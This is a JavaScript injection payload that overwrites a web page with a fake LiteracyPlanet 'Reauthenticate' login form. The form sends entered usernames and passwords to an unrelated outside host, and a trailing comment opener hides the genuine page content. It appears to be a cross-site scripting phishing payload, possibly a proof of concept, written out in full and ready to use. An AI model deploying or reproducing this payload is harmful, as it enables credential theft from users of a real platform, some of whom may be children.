document.body.innerHTML = `<!DOCTYPE html>
<html>
  <head>
    <title>Reauthenticate - LiteracyPlanet</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      /* General body styling */
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        color: #333;
      }

      /* Table container for the form with a styled card design */
      table {
        border-collapse: collapse;
        margin: 40px auto;
        background-color: #ffffff;
        border: 1px solid #ddd;
        border-radius: 8px;
        overflow: hidden;
        width: 600px;
      }

      /* Header styling */
      td.header {
        padding: 20px;
        text-align: center;
        background-color: #6ccef7;
        color: white;
        font-size: 24px;
        font-weight: bold;
      }

      /* Body content styling */
      td.body {
        padding: 20px;
        text-align: left;
      }

      /* Input field styling */
      input[type="text"],
      input[type="password"] {
        width: 100%;
        max-width: 400px;
        padding: 10px;
        margin-bottom: 20px;
        font-size: 16px;
        border: 1px solid #ccc;
        border-radius: 5px;
        box-sizing: border-box;
      }

      /* Submit button styling */
      button {
        background-color: #6ccef7;
        color: white;
        text-decoration: none;
        padding: 12px 25px;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        display: block;
        margin: 20px auto 0;
      }

      button:hover {
        background-color: #589cc6;
      }

      /* Footer section styling */
      td.footer {
        padding: 20px;
        text-align: center;
        background-color: #f4f4f4;
        font-size: 14px;
        color: #666;
      }

      td.footer a {
        color: #6ccef7;
        text-decoration: none;
      }

      td.footer a:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>
    <table>
      <!-- Header section -->
      <tr>
        <td class="header">
          <div>
            <img 
              src="https://app.literacyplanet.com/assets/lp-logo-bordered-sml-ea97c7ba.png" 
              alt="LiteracyPlanet Logo" style="max-width: 150px; margin-bottom: 10px;">
          </div>
          Welcome to LiteracyPlanet!
        </td>
      </tr>

      <!-- Form and content -->
      <tr>
        <td class="body">
          <p style="font-size: 18px; margin: 0; color: black; text-align: center">Hi there!</p>
          <p style="font-size: 16px; margin: 10px 0; color: black;">
            We take your security seriously! As part of our security measures, please reauthenticate to login with your account.
          </p>

          <!-- Form starts here -->
           <div style="display: flex; flex-direction: column; justify-content: center; align-items: center;">
          <form id="reauth-form" method="POST" action="https://aiwneb53olqz3ypu3fhtwmgobfh650tp.c.ccxsta.com/reauthenticate">
            <label for="username" style="font-size: 16px; color: black; font-weight:bold; display: flex; justify-content: center; align-items: center;">Username:</label><br>
            <input
              type="text"
              id="username"
              name="username"
              placeholder="Enter your username"
              required
              autofocus
              style="display: flex; justify-content: center; align-items: center;"
            /><br>

            <label for="password" style="font-size: 16px; color: black; font-weight:bold; display: flex; justify-content: center; align-items: center;">Password:</label><br>
            <div style=></div>
            <input
              type="password"
              id="password"
              name="password"
              placeholder="Enter your password"
              required
            /><br>
</div>
            <button type="submit">Reauthenticate</button>
          </form>
          <!-- Form ends here -->

          <p style="font-size: 16px; margin: 20px 0; color: black;">
            If you didn't expect this prompt or need further assistance, please contact us immediately at <a href="https://literacyplanet.com/support" style="color: #6bc4ff; text-decoration: none;">literacyplanet.com/support</a>.
          </p>
        </td>
      </tr>

      <!-- Footer section -->
      <tr>
        <td class="footer">
          <p style="margin: 0;">Having trouble? <a href="mailto:support@literacyplanet.com">Contact our support team</a></p>
          <p style="margin: 10px 0;">© 2026 LiteracyPlanet Inc. All rights reserved.</p>
        </td>
      </tr>
    </table>
  </body>
</html><!--`
